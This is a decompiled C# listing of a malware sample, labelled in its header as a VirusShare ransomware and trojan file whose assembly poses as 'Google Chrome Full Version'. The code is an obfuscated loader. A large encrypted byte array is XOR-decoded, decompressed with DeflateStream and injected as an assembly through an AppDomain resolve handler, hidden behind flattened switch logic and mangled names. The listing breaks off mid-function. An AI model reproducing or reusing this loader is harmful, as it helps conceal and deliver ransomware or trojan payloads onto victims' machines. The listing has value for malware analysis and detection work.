// Decompiled with JetBrains decompiler
// Type: pebdynyveq
// Assembly: Google Chrome Full Version, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8024666E-1682-4571-A2AC-033F4530F911
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-b772a931021ad63094de28fb08477220cef8fdf31237fb24fb8c08d4bca34175.exe

using j;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Policy;
using Ⴄ;

public sealed class pebdynyveq : Attribute
{
  public const string zwgoencven = "4.0.0.0";
  internal static pebdynyveq.Ⴅ Ⴃ;

  static pebdynyveq() => ႰႰ.ႥႥ.Ⴈ();

  internal static Assembly Ⴗ([In] object obj0, [In] ResolveEventArgs obj1) => (Assembly) pebdynyveq.Ⴄ(19, (object) obj1, (string) null, "58d7b752-3018-457a-a1cd-95a9de22a231", 1365, typeof (ႰႰ.ႥႤ));

  internal static object Ⴄ([In] int obj0, [In] object obj1, [In] string obj2, [In] string obj3, [In] int obj4, [In] Type obj5)
  {
    byte[] ⴗ = Ⴄ.Ⴜ.Ⴗ;
    char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
    while (obj4 > 0)
    {
      int num1 = 9;
      IEvidenceFactory evidenceFactory;
      object obj6;
      IComparable<string> name;
      _AppDomain appDomain;
      object obj7;
      Array buffer;
      int index1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_3;
          case 1:
            buffer = (Array) new byte[1365]
            {
              (byte) 177,
              (byte) 206,
              (byte) 222,
              (byte) 133,
              (byte) 134,
              (byte) 139,
              (byte) 136,
              (byte) 137,
              (byte) 138,
              (byte) 73,
              (byte) 136,
              (byte) 178,
              (byte) 177,
              (byte) 124,
              (byte) 96,
              (byte) 189,
              (byte) 50,
              (byte) 211,
              (byte) 84,
              (byte) 82,
              (byte) 80,
              (byte) 149,
              (byte) 248,
              (byte) 88,
              (byte) 210,
              (byte) 162,
              (byte) 184,
              (byte) 42,
              (byte) 175,
              (byte) 110,
              (byte) 12,
              (byte) 128,
              (byte) 94,
              (byte) 200,
              (byte) 220,
              (byte) 230,
              (byte) 183,
              (byte) 128,
              (byte) 196,
              (byte) 11,
              (byte) 34,
              (byte) 45,
              (byte) 10,
              (byte) 220,
              (byte) 44,
              (byte) 46,
              (byte) 33,
              (byte) 15,
              (byte) 8,
              (byte) 34,
              (byte) 22,
              (byte) 219,
              (byte) 52,
              (byte) 5,
              (byte) 26,
              (byte) 39,
              (byte) 36,
              (byte) 5,
              (byte) 245,
              (byte) 63,
              (byte) 44,
              (byte) 213,
              (byte) 194,
              (byte) 208,
              (byte) 235,
              (byte) 29,
              (byte) 198,
              (byte) 227,
              (byte) 24,
              (byte) 5,
              (byte) 3,
              (byte) 246,
              (byte) 58,
              (byte) 201,
              (byte) 226,
              (byte) 243,
              (byte) 196,
              (byte) 37,
              (byte) 142,
              (byte) 190,
              (byte) 189,
              (byte) 4,
              (byte) 158,
              (byte) 65,
              (byte) 26,
              (byte) 151,
              (byte) 207,
              (byte) 159,
              (byte) 156,
              (byte) 132,
              (byte) 218,
              (byte) 187,
              (byte) 24,
              (byte) 19,
              (byte) 239,
              (byte) 102,
              (byte) 224,
              (byte) 194,
              (byte) 66,
              (byte) 155,
              (byte) 198,
              (byte) 199,
              (byte) 250,
              (byte) 77,
              (byte) 204,
              (byte) 79,
              (byte) 204,
              (byte) 205,
              (byte) 206,
              (byte) 172,
              (byte) 194,
              (byte) 41,
              (byte) 146,
              (byte) 209,
              (byte) 200,
              (byte) 31,
              (byte) 246,
              (byte) 245,
              (byte) 185,
              (byte) 31,
              (byte) 120,
              (byte) 186,
              (byte) 126,
              (byte) 219,
              (byte) 60,
              (byte) 7,
              (byte) 91,
              (byte) 64,
              (byte) 195,
              (byte) 130,
              (byte) 247,
              (byte) 225,
              (byte) 230,
              (byte) 51,
              (byte) 248,
              (byte) 250,
              (byte) 242,
              (byte) 127,
              (byte) 254,
              (byte) 253,
              (byte) 198,
              (byte) 79,
              (byte) 193,
              (byte) 83,
              (byte) 84,
              (byte) 128,
              (byte) 180,
              (byte) 165,
              (byte) 214,
              (byte) 63,
              (byte) 200,
              (byte) 182,
              (byte) 166,
              (byte) 69,
              (byte) 216,
              (byte) 135,
              (byte) 27,
              (byte) 156,
              (byte) 164,
              (byte) 185,
              (byte) 130,
              (byte) 227,
              (byte) 68,
              (byte) 30,
              (byte) 222,
              (byte) 119,
              (byte) 80,
              (byte) 245,
              (byte) 170,
              (byte) 85,
              (byte) 235,
              byte.MaxValue,
              (byte) 177,
              (byte) 64,
              (byte) 212,
              (byte) 68,
              (byte) 80,
              (byte) 247,
              (byte) 188,
              (byte) 126,
              (byte) 70,
              (byte) 181,
              (byte) 44,
              (byte) 219,
              (byte) 1,
              (byte) 238,
              (byte) 53,
              (byte) 117,
              (byte) 250,
              (byte) 66,
              (byte) 162,
              (byte) 213,
              (byte) 158,
              byte.MaxValue,
              (byte) 96,
              (byte) 173,
              (byte) 29,
              (byte) 27,
              (byte) 168,
              (byte) 99,
              (byte) 50,
              (byte) 91,
              (byte) 217,
              (byte) 12,
              (byte) 139,
              (byte) 146,
              (byte) 216,
              (byte) 96,
              (byte) 48,
              (byte) 27,
              (byte) 104,
              (byte) 149,
              (byte) 80,
              (byte) 147,
              (byte) 31,
              (byte) 193,
              (byte) 114,
              (byte) 77,
              (byte) 154,
              (byte) 25,
              (byte) 123,
              (byte) 191,
              (byte) 133,
              (byte) 173,
              (byte) 46,
              (byte) 195,
              (byte) 16,
              (byte) 36,
              (byte) 36,
              (byte) 38,
              (byte) 104,
              (byte) 110,
              (byte) 34,
              (byte) 27,
              (byte) 207,
              (byte) 253,
              (byte) 162,
              (byte) 34,
              (byte) 48,
              (byte) 196,
              (byte) 132,
              (byte) 90,
              (byte) 27,
              (byte) 77,
              (byte) 36,
              (byte) 151,
              (byte) 0,
              (byte) 166,
              (byte) 11,
              (byte) 196,
              (byte) 148,
              (byte) 125,
              (byte) 198,
              (byte) 140,
              (byte) 235,
              (byte) 44,
              (byte) 48,
              (byte) 156,
              (byte) 240,
              (byte) 94,
              (byte) 56,
              (byte) 10,
              (byte) 64,
              (byte) 175,
              (byte) 4,
              (byte) 96,
              (byte) 50,
              (byte) 87,
              (byte) 38,
              (byte) 92,
              (byte) 231,
              (byte) 59,
              (byte) 39,
              (byte) 148,
              (byte) 89,
              (byte) 83,
              (byte) 3,
              (byte) 164,
              (byte) 130,
              (byte) 69,
              (byte) 129,
              (byte) 57,
              (byte) 185,
              (byte) 149,
              (byte) 109,
              (byte) 96,
              (byte) 123,
              (byte) 184,
              (byte) 191,
              (byte) 85,
              (byte) 251,
              (byte) 115,
              (byte) 188,
              (byte) 190,
              (byte) 84,
              (byte) 66,
              (byte) 23,
              (byte) 192,
              (byte) 253,
              (byte) 239,
              (byte) 59,
              (byte) 14,
              (byte) 166,
              (byte) 244,
              (byte) 214,
              (byte) 182,
              (byte) 51,
              (byte) 208,
              (byte) 172,
              (byte) 156,
              (byte) 230,
              (byte) 212,
              (byte) 141,
              (byte) 32,
              (byte) 164,
              (byte) 136,
              (byte) 232,
              (byte) 152,
              (byte) 26,
              (byte) 216,
              (byte) 57,
              (byte) 99,
              (byte) 23,
              (byte) 105,
              (byte) 127,
              (byte) 244,
              (byte) 131,
              (byte) 52,
              (byte) 181,
              (byte) 225,
              (byte) 48,
              (byte) 166,
              (byte) 122,
              (byte) 117,
              (byte) 180,
              (byte) 119,
              (byte) 102,
              (byte) 120,
              (byte) 102,
              (byte) 119,
              (byte) 149,
              (byte) 76,
              (byte) 64,
              (byte) 118,
              (byte) 101,
              (byte) 119,
              (byte) 212,
              (byte) 253,
              (byte) 55,
              (byte) 182,
              (byte) 116,
              (byte) 58,
              (byte) 116,
              (byte) 152,
              (byte) 5,
              (byte) 203,
              (byte) 147,
              (byte) 248,
              (byte) 176,
              (byte) 114,
              (byte) 195,
              (byte) 8,
              (byte) 35,
              (byte) 76,
              (byte) 57,
              (byte) 144,
              (byte) 126,
              (byte) 85,
              (byte) 47,
              (byte) 14,
              (byte) 115,
              (byte) 151,
              (byte) 24,
              (byte) 232,
              (byte) 138,
              (byte) 234,
              (byte) 22,
              (byte) 26,
              (byte) 125,
              (byte) 85,
              (byte) 107,
              (byte) 156,
              (byte) 59,
              (byte) 88,
              (byte) 157,
              (byte) 173,
              (byte) 218,
              (byte) 91,
              (byte) 94,
              (byte) 55,
              (byte) 56,
              (byte) 69,
              (byte) 241,
              (byte) 48,
              (byte) 87,
              (byte) 226,
              (byte) 210,
              (byte) 202,
              (byte) 55,
              (byte) 50,
              (byte) 94,
              (byte) 12,
              (byte) 242,
              (byte) 129,
              (byte) 201,
              (byte) 166,
              (byte) 175,
              (byte) 200,
              (byte) 64,
              (byte) 140,
              (byte) 127,
              (byte) 143,
              (byte) 43,
              (byte) 144,
              (byte) 11,
              (byte) 175,
              (byte) 84,
              (byte) 145,
              (byte) 19,
              (byte) 105,
              (byte) 217,
              (byte) 82,
              (byte) 234,
              (byte) 24,
              (byte) 252,
              (byte) 49,
              (byte) 11,
              (byte) 166,
              (byte) 226,
              (byte) 101,
              (byte) 150,
              (byte) 248,
              (byte) 12,
              (byte) 131,
              (byte) 167,
              (byte) 1,
              (byte) 135,
              (byte) 30,
              (byte) 178,
              (byte) 82,
              (byte) 240,
              (byte) 33,
              (byte) 140,
              (byte) 161,
              (byte) 187,
              (byte) 43,
              (byte) 38,
              (byte) 252,
              (byte) 174,
              (byte) 143,
              (byte) 114,
              (byte) 230,
              (byte) 195,
              (byte) 157,
              (byte) 227,
              (byte) 158,
              (byte) 20,
              (byte) 35,
              (byte) 251,
              (byte) 103,
              (byte) 10,
              (byte) 115,
              (byte) 173,
              (byte) 53,
              (byte) 160,
              (byte) 147,
              (byte) 45,
              (byte) 94,
              (byte) 205,
              (byte) 239,
              (byte) 214,
              (byte) 164,
              (byte) 243,
              (byte) 20,
              (byte) 235,
              (byte) 23,
              (byte) 164,
              (byte) 102,
              (byte) 79,
              (byte) 90,
              (byte) 193,
              (byte) 214,
              (byte) 223,
              (byte) 45,
              (byte) 69,
              (byte) 35,
              (byte) 227,
              (byte) 174,
              (byte) 185,
              (byte) 120,
              (byte) 57,
              (byte) 102,
              (byte) 50,
              (byte) 26,
              (byte) 135,
              (byte) 20,
              (byte) 184,
              (byte) 134,
              (byte) 226,
              (byte) 250,
              (byte) 103,
              (byte) 100,
              (byte) 96,
              (byte) 28,
              (byte) 82,
              (byte) 201,
              (byte) 237,
              (byte) 83,
              (byte) 12,
              (byte) 23,
              (byte) 76,
              (byte) 47,
              (byte) 138,
              (byte) 110,
              (byte) 222,
              (byte) 59,
              (byte) 46,
              (byte) 145,
              (byte) 138,
              (byte) 130,
              (byte) 221,
              (byte) 30,
              (byte) 26,
              (byte) 3,
              (byte) 95,
              (byte) 112,
              (byte) 246,
              byte.MaxValue,
              (byte) 241,
              (byte) 171,
              (byte) 214,
              (byte) 10,
              (byte) 18,
              (byte) 182,
              (byte) 140,
              (byte) 242,
              (byte) 65,
              (byte) 50,
              (byte) 34,
              (byte) 227,
              (byte) 60,
              (byte) 229,
              (byte) 188,
              (byte) 23,
              (byte) 180,
              (byte) 158,
              (byte) 113,
              (byte) 34,
              (byte) 176,
              (byte) 212,
              (byte) 197,
              (byte) 180,
              (byte) 208,
              (byte) 25,
              (byte) 227,
              (byte) 234,
              (byte) 193,
              (byte) 134,
              (byte) 14,
              (byte) 236,
              (byte) 87,
              (byte) 134,
              (byte) 131,
              (byte) 234,
              (byte) 127,
              (byte) 107,
              (byte) 21,
              (byte) 230,
              (byte) 92,
              (byte) 186,
              (byte) 23,
              (byte) 15,
              (byte) 172,
              (byte) 223,
              (byte) 88,
              (byte) 38,
              (byte) 249,
              (byte) 90,
              (byte) 117,
              (byte) 226,
              (byte) 63,
              (byte) 43,
              (byte) 123,
              (byte) 16,
              (byte) 160,
              (byte) 95,
              (byte) 6,
              (byte) 0,
              (byte) 93,
              (byte) 173,
              (byte) 62,
              (byte) 70,
              (byte) 254,
              (byte) 6,
              (byte) 32,
              (byte) 207,
              (byte) 227,
              (byte) 89,
              (byte) 68,
              (byte) 116,
              (byte) 205,
              (byte) 94,
              (byte) 10,
              (byte) 2,
              (byte) 111,
              (byte) 68,
              (byte) 10,
              (byte) 204,
              (byte) 200,
              (byte) 191,
              (byte) 199,
              (byte) 169,
              (byte) 176,
              (byte) 18,
              (byte) 81,
              (byte) 174,
              (byte) 0,
              (byte) 26,
              (byte) 122,
              (byte) 9,
              (byte) 179,
              (byte) 55,
              (byte) 131,
              (byte) 248,
              (byte) 115,
              (byte) 101,
              (byte) 197,
              (byte) 247,
              (byte) 107,
              (byte) 77,
              (byte) 215,
              (byte) 158,
              (byte) 209,
              (byte) 248,
              (byte) 94,
              (byte) 114,
              (byte) 90,
              (byte) 81,
              (byte) 36,
              (byte) 176,
              (byte) 50,
              (byte) 58,
              (byte) 63,
              (byte) 55,
              (byte) 61,
              (byte) 128,
              (byte) 134,
              (byte) 188,
              (byte) 25,
              (byte) 164,
              (byte) 165,
              (byte) 10,
              (byte) 75,
              (byte) 88,
              (byte) 212,
              (byte) 143,
              (byte) 186,
              (byte) 88,
              (byte) 169,
              (byte) 227,
              (byte) 175,
              (byte) 96,
              (byte) 68,
              (byte) 51,
              (byte) 69,
              (byte) 69,
              (byte) 106,
              (byte) 87,
              (byte) 165,
              (byte) 168,
              (byte) 124,
              (byte) 151,
              (byte) 220,
              (byte) 127,
              (byte) 197,
              (byte) 144,
              (byte) 50,
              (byte) 199,
              (byte) 27,
              (byte) 51,
              (byte) 56,
              (byte) 238,
              (byte) 142,
              (byte) 143,
              (byte) 50,
              (byte) 92,
              (byte) 52,
              (byte) 174,
              (byte) 206,
              (byte) 161,
              (byte) 37,
              (byte) 156,
              (byte) 72,
              (byte) 102,
              (byte) 39,
              (byte) 87,
              (byte) 224,
              (byte) 83,
              (byte) 84,
              (byte) 59,
              (byte) 238,
              (byte) 172,
              (byte) 80,
              (byte) 160,
              (byte) 231,
              (byte) 246,
              (byte) 205,
              (byte) 179,
              (byte) 67,
              (byte) 248,
              (byte) 239,
              (byte) 116,
              (byte) 207,
              byte.MaxValue,
              (byte) 249,
              (byte) 214,
              (byte) 83,
              (byte) 100,
              (byte) 135,
              (byte) 25,
              (byte) 103,
              (byte) 44,
              (byte) 77,
              (byte) 167,
              (byte) 46,
              (byte) 115,
              (byte) 75,
              (byte) 125,
              (byte) 188,
              (byte) 76,
              (byte) 72,
              (byte) 204,
              (byte) 215,
              (byte) 218,
              (byte) 124,
              (byte) 56,
              (byte) 119,
              (byte) 5,
              (byte) 62,
              (byte) 138,
              (byte) 105,
              (byte) 108,
              (byte) 238,
              (byte) 101,
              (byte) 244,
              (byte) 218,
              (byte) 254,
              (byte) 168,
              (byte) 101,
              (byte) 105,
              (byte) 83,
              (byte) 138,
              (byte) 209,
              (byte) 185,
              (byte) 1,
              (byte) 201,
              (byte) 133,
              (byte) 83,
              (byte) 78,
              (byte) 165,
              (byte) 111,
              (byte) 18,
              (byte) 195,
              (byte) 229,
              (byte) 207,
              (byte) 102,
              (byte) 43,
              (byte) 206,
              (byte) 252,
              (byte) 246,
              (byte) 188,
              (byte) 122,
              (byte) 149,
              (byte) 97,
              (byte) 145,
              (byte) 192,
              (byte) 125,
              (byte) 53,
              (byte) 164,
              (byte) 72,
              (byte) 204,
              (byte) 141,
              (byte) 48,
              (byte) 75,
              (byte) 157,
              (byte) 49,
              (byte) 179,
              (byte) 24,
              (byte) 83,
              (byte) 108,
              (byte) 100,
              (byte) 118,
              (byte) 176,
              (byte) 208,
              (byte) 137,
              (byte) 192,
              (byte) 192,
              (byte) 61,
              (byte) 81,
              (byte) 26,
              (byte) 161,
              (byte) 218,
              (byte) 167,
              (byte) 223,
              (byte) 106,
              (byte) 156,
              (byte) 118,
              (byte) 163,
              (byte) 95,
              (byte) 174,
              (byte) 52,
              (byte) 121,
              (byte) 8,
              (byte) 5,
              (byte) 174,
              (byte) 136,
              (byte) 225,
              (byte) 169,
              (byte) 131,
              (byte) 137,
              (byte) 218,
              (byte) 150,
              (byte) 9,
              (byte) 183,
              (byte) 236,
              (byte) 22,
              (byte) 43,
              (byte) 18,
              (byte) 208,
              (byte) 205,
              (byte) 221,
              (byte) 61,
              (byte) 102,
              (byte) 48,
              (byte) 19,
              (byte) 198,
              (byte) 235,
              (byte) 234,
              (byte) 104,
              (byte) 27,
              (byte) 103,
              (byte) 188,
              (byte) 56,
              (byte) 215,
              (byte) 128,
              (byte) 9,
              (byte) 201,
              (byte) 41,
              (byte) 79,
              (byte) 204,
              (byte) 133,
              (byte) 185,
              (byte) 191,
              (byte) 254,
              (byte) 43,
              (byte) 191,
              (byte) 161,
              (byte) 112,
              (byte) 121,
              (byte) 140,
              (byte) 37,
              (byte) 237,
              (byte) 13,
              (byte) 134,
              (byte) 68,
              (byte) 172,
              (byte) 74,
              (byte) 72,
              (byte) 214,
              (byte) 246,
              (byte) 127,
              (byte) 245,
              (byte) 183,
              (byte) 28,
              (byte) 70,
              (byte) 109,
              (byte) 219,
              (byte) 17,
              (byte) 245,
              (byte) 218,
              (byte) 234,
              (byte) 132,
              (byte) 79,
              (byte) 81,
              (byte) 201,
              (byte) 132,
              (byte) 180,
              (byte) 234,
              (byte) 83,
              (byte) 241,
              (byte) 203,
              (byte) 2,
              (byte) 201,
              (byte) 210,
              (byte) 10,
              (byte) 143,
              (byte) 163,
              (byte) 94,
              (byte) 90,
              (byte) 10,
              (byte) 89,
              (byte) 80,
              (byte) 244,
              (byte) 87,
              (byte) 61,
              (byte) 146,
              (byte) 178,
              (byte) 38,
              (byte) 81,
              (byte) 96,
              (byte) 169,
              (byte) 192,
              (byte) 123,
              (byte) 160,
              (byte) 155,
              (byte) 57,
              (byte) 171,
              (byte) 251,
              (byte) 32,
              (byte) 80,
              (byte) 25,
              (byte) 163,
              (byte) 47,
              (byte) 94,
              (byte) 3,
              (byte) 30,
              (byte) 225,
              (byte) 158,
              (byte) 223,
              (byte) 97,
              (byte) 33,
              (byte) 114,
              (byte) 170,
              (byte) 120,
              (byte) 10,
              (byte) 204,
              (byte) 87,
              (byte) 117,
              (byte) 175,
              (byte) 188,
              (byte) 202,
              (byte) 45,
              (byte) 47,
              (byte) 48,
              (byte) 214,
              (byte) 130,
              (byte) 95,
              (byte) 228,
              (byte) 21,
              (byte) 189,
              (byte) 201,
              (byte) 112,
              (byte) 247,
              (byte) 48,
              (byte) 233,
              (byte) 104,
              (byte) 221,
              (byte) 227,
              (byte) 132,
              (byte) 94,
              (byte) 78,
              (byte) 243,
              (byte) 249,
              (byte) 115,
              (byte) 43,
              (byte) 238,
              (byte) 97,
              (byte) 201,
              byte.MaxValue,
              (byte) 40,
              (byte) 94,
              (byte) 64,
              (byte) 156,
              (byte) 84,
              (byte) 31,
              (byte) 236,
              (byte) 139,
              (byte) 170,
              (byte) 247,
              (byte) 102,
              (byte) 75,
              (byte) 10,
              (byte) 131,
              (byte) 187,
              (byte) 69,
              (byte) 147,
              (byte) 141,
              (byte) 104,
              (byte) 228,
              (byte) 192,
              (byte) 242,
              (byte) 163,
              (byte) 173,
              (byte) 148,
              (byte) 195,
              (byte) 237,
              (byte) 105,
              (byte) 27,
              (byte) 190,
              (byte) 125,
              (byte) 91,
              (byte) 228,
              (byte) 115,
              (byte) 205,
              (byte) 112,
              (byte) 241,
              (byte) 67,
              (byte) 132,
              (byte) 141,
              (byte) 250,
              (byte) 219,
              (byte) 99,
              (byte) 67,
              (byte) 83,
              (byte) 159,
              (byte) 39,
              (byte) 166,
              (byte) 201,
              (byte) 20,
              (byte) 194,
              (byte) 193,
              (byte) 253,
              (byte) 101,
              (byte) 171,
              (byte) 247,
              (byte) 130,
              (byte) 205,
              (byte) 132,
              (byte) 220,
              (byte) 140,
              (byte) 35,
              (byte) 238,
              (byte) 80,
              (byte) 211,
              (byte) 213,
              (byte) 148,
              (byte) 197,
              (byte) 165,
              (byte) 183,
              (byte) 248,
              (byte) 61,
              (byte) 25,
              (byte) 131,
              (byte) 96,
              (byte) 235,
              (byte) 9,
              (byte) 73,
              (byte) 165,
              (byte) 204,
              (byte) 238,
              (byte) 27,
              (byte) 215,
              (byte) 67,
              (byte) 203,
              (byte) 125,
              (byte) 253,
              (byte) 224,
              (byte) 222,
              (byte) 248,
              (byte) 125,
              (byte) 39,
              (byte) 230,
              (byte) 169,
              (byte) 105,
              (byte) 163,
              (byte) 168,
              (byte) 9,
              (byte) 43,
              (byte) 20,
              (byte) 105,
              (byte) 10,
              (byte) 215,
              (byte) 116,
              (byte) 149,
              (byte) 50,
              (byte) 147,
              (byte) 86,
              (byte) 102,
              (byte) 30,
              byte.MaxValue,
              (byte) 114,
              (byte) 91,
              (byte) 37,
              (byte) 126,
              (byte) 186,
              (byte) 181,
              (byte) 245,
              (byte) 141,
              (byte) 142,
              (byte) 212,
              (byte) 228,
              (byte) 105,
              (byte) 102,
              (byte) 21,
              (byte) 42,
              (byte) 69,
              (byte) 54,
              (byte) 127,
              (byte) 238,
              (byte) 253,
              (byte) 112,
              (byte) 236,
              (byte) 20,
              (byte) 5,
              (byte) 197,
              (byte) 89,
              (byte) 122,
              (byte) 52,
              (byte) 8,
              (byte) 185,
              (byte) 240,
              (byte) 192,
              (byte) 151,
              (byte) 195,
              (byte) 136,
              (byte) 237,
              (byte) 31,
              (byte) 21,
              (byte) 175,
              (byte) 231,
              (byte) 50,
              (byte) 82,
              (byte) 27,
              (byte) 189,
              (byte) 43,
              (byte) 190,
              (byte) 108,
              (byte) 105,
              (byte) 115,
              (byte) 164,
              (byte) 34,
              (byte) 52,
              (byte) 15,
              (byte) 182,
              (byte) 34,
              (byte) 160,
              (byte) 28,
              (byte) 16,
              (byte) 172,
              (byte) 246,
              (byte) 178,
              (byte) 182,
              (byte) 216,
              (byte) 28,
              (byte) 166,
              (byte) 19,
              (byte) 60,
              (byte) 188,
              (byte) 103,
              (byte) 119,
              (byte) 2,
              (byte) 201,
              (byte) 163,
              (byte) 216,
              (byte) 198,
              (byte) 244,
              (byte) 193,
              (byte) 212,
              (byte) 76,
              (byte) 212,
              (byte) 206,
              (byte) 154,
              (byte) 94,
              (byte) 81,
              (byte) 83,
              (byte) 151,
              (byte) 78,
              (byte) 70,
              (byte) 72,
              (byte) 75,
              (byte) 139,
              (byte) 75,
              (byte) 26,
              (byte) 39,
              (byte) 104,
              (byte) 176,
              (byte) 247,
              (byte) 152,
              (byte) 86,
              (byte) 108,
              (byte) 111,
              (byte) 78,
              (byte) 121,
              (byte) 88,
              (byte) 123,
              (byte) 154,
              (byte) 150,
              (byte) 111,
              (byte) 79,
              (byte) 98,
              (byte) 97,
              (byte) 72,
              (byte) 83,
              (byte) 110,
              (byte) 73,
              (byte) 84,
              (byte) 95,
              (byte) 110,
              (byte) 73,
              (byte) 112,
              (byte) 151,
              (byte) 185,
              (byte) 126,
              (byte) 188,
              (byte) 124,
              (byte) 174,
              (byte) 154,
              (byte) 115,
              (byte) 91,
              (byte) 218,
              (byte) 191,
              (byte) 87,
              (byte) 95,
              (byte) 190,
              (byte) 138,
              (byte) 64,
              (byte) 152,
              (byte) 90,
              (byte) 166,
              (byte) 140,
              (byte) 175,
              (byte) 162,
              (byte) 173,
              (byte) 128,
              (byte) 179,
              (byte) 106,
              (byte) 134,
              (byte) 136,
              (byte) 87,
              (byte) 189,
              (byte) 181,
              (byte) 116,
              (byte) 176,
              (byte) 130,
              (byte) 93,
              (byte) 103,
              (byte) 124,
              (byte) 157,
              (byte) 145,
              (byte) 144,
              (byte) 155,
              (byte) 190,
              (byte) 25,
              (byte) 94,
              (byte) 124,
              (byte) 141,
              (byte) 161,
              (byte) 136,
              (byte) 75,
              (byte) 65,
              (byte) 70,
              (byte) 143,
              (byte) 79,
              (byte) 149,
              (byte) 89,
              (byte) 187,
              (byte) 99,
              (byte) 177,
              (byte) 105,
              (byte) 119,
              (byte) 76,
              (byte) 117,
              (byte) 122,
              (byte) 91,
              (byte) 128,
              (byte) 146,
              (byte) 145,
              (byte) 76,
              (byte) 164,
              (byte) 146,
              (byte) 157,
              (byte) 156,
              (byte) 163,
              (byte) 94,
              (byte) 142,
              (byte) 36,
              (byte) 189,
              (byte) 178,
              (byte) 47,
              (byte) 63,
              (byte) 8,
              (byte) 42,
              (byte) 10,
              (byte) 239,
              (byte) 91,
              (byte) 4,
              (byte) 139,
              (byte) 95,
              (byte) 212,
              (byte) 146,
              (byte) 89,
              (byte) 32,
              (byte) 221,
              (byte) 115,
              (byte) 231,
              (byte) 100,
              (byte) 189,
              (byte) 27,
              (byte) 89,
              (byte) 31,
              (byte) 137,
              (byte) 45,
              (byte) 168,
              (byte) 220,
              (byte) 80,
              (byte) 153,
              (byte) 91,
              (byte) 162,
              (byte) 30,
              (byte) 51,
              (byte) 101,
              (byte) 141,
              (byte) 167,
              (byte) 177,
              (byte) 99,
              (byte) 221,
              (byte) 220,
              (byte) 31,
              (byte) 143,
              (byte) 149,
              (byte) 72,
              (byte) 252,
              (byte) 240,
              (byte) 113,
              (byte) 177,
              (byte) 171,
              (byte) 188,
              (byte) 77,
              (byte) 244,
              (byte) 175,
              (byte) 150,
              (byte) 145,
              (byte) 138,
              (byte) 213,
              (byte) 172,
              (byte) 45,
              (byte) 199,
              (byte) 239,
              (byte) 224,
              (byte) 97,
              (byte) 206,
              (byte) 163,
              byte.MaxValue,
              (byte) 212,
              (byte) 132,
              (byte) 134,
              (byte) 131,
              (byte) 105,
              (byte) 128,
              (byte) 139,
              (byte) 223,
              (byte) 41,
              (byte) 138,
              (byte) 2,
              (byte) 245,
              (byte) 140,
              (byte) 93,
              (byte) 14,
              (byte) 230,
              (byte) 89,
              (byte) 186,
              (byte) 139,
              (byte) 156,
              (byte) 149,
              (byte) 150
            };
            goto case 2;
          case 2:
            num1 = 13;
            continue;
          case 3:
          case 12:
            appDomain = (_AppDomain) iolzjmgwdl.Ⴃ(356, (short) 283);
            obj7 = (object) (Dictionary<string, string>) iolzjmgwdl.Ⴈ<AppDomain, string>((AppDomain) appDomain, obj3, '\f', (short) 33);
            num1 = 11;
            continue;
          case 5:
            goto label_16;
          case 6:
          case 10:
            num1 = index1 >= 0 ? (int) ⴗ[12] : 5;
            continue;
          case 7:
            (buffer as byte[])[index1] ^= (byte) (index1 + obj4 - obj0 & (int) byte.MaxValue);
            num1 = 14;
            continue;
          case 8:
            obj7 = (object) new Dictionary<string, string>();
            ႰႰ.Ⴐ<AppDomain, string, object>((AppDomain) appDomain, obj3, (object) (Dictionary<string, string>) obj7, (short) 30, '&');
            num1 = (int) ⴗ[52] - 244;
            continue;
          case 9:
            evidenceFactory = (IEvidenceFactory) ႰႳ.Ⴄ(262, 'ŧ');
            obj6 = (object) (ResolveEventArgs) obj1;
            name = (IComparable<string>) iolzjmgwdl.Ⴍ<string, string>(obj3, ႰႰ.ႥႥ.Ⴃ(0, '¦', 515358949), (short) 785, (short) 843);
            num1 = 3;
            continue;
          case 11:
            if ((Dictionary<string, string>) obj7 == null)
            {
              num1 = (int) ⴗ[168] - 211;
              continue;
            }
            goto label_36;
          case 13:
            index1 = obj4 - 1;
            num1 = (int) ⴃ[3] - 57977;
            continue;
          case 14:
            --index1;
            num1 = 10;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (pebdynyveq.Ⴄ);
            num1 = (int) ⴗ[191] - 151;
            continue;
        }
      }
label_16:
      object obj8 = (object) new MemoryStream();
      IDisposable disposable = (IDisposable) new DeflateStream((Stream) new MemoryStream(buffer as byte[]), CompressionMode.Decompress, true);
      try
      {
        int num2 = 5;
        object obj9;
        int num3;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
            case 7:
              iolzjmgwdl.Ⴐ<Stream>((Stream) obj8, obj9 as byte[], 0, num3, 165, 219);
              goto case 3;
            case 3:
              num2 = (num3 = iolzjmgwdl.Ⴓ<Stream>((Stream) disposable, (byte[]) obj9, 0, (obj9 as byte[]).Length, (short) 946, 955)) > 0 ? 6 : 4;
              continue;
            case 4:
              goto label_27;
            default:
              obj9 = (object) new byte[1024];
              num2 = (int) ⴗ[105] - 63;
              continue;
          }
        }
      }
      finally
      {
        int num4 = 4;
        while (true)
        {
          switch (num4)
          {
            case 2:
            case 6:
              goto label_26;
            case 5:
              goto label_25;
            default:
              num4 = (Stream) disposable == null ? 6 : (int) ⴗ[177] - 123;
              continue;
          }
        }
label_25:
        disposable.Dispose();
label_26:;
      }
label_27:
      int num5 = 13;
label_28:
      object obj10;
      Array array;
      int index2;
      while (true)
      {
        switch (num5)
        {
          case 0:
            ႰႰ.Ⴐ<AppDomain, string, object>((AppDomain) appDomain, name as string, (object) (Assembly) obj10, (short) 76, 't');
            num5 = 7;
            continue;
          case 1:
            num5 = (int) ⴗ[89] - 163;
            continue;
          case 3:
            goto label_38;
          case 4:
            num5 = !((Dictionary<string, string>) obj7).ContainsKey((obj6 as ResolveEventArgs).Name) ? (int) ⴗ[51] - 43 : (int) ⴃ[292] - 61424;
            continue;
          case 5:
            ++index2;
            num5 = (int) ⴃ[157] - 15963;
            continue;
          case 6:
          case 8:
          case 11:
            goto label_39;
          case 7:
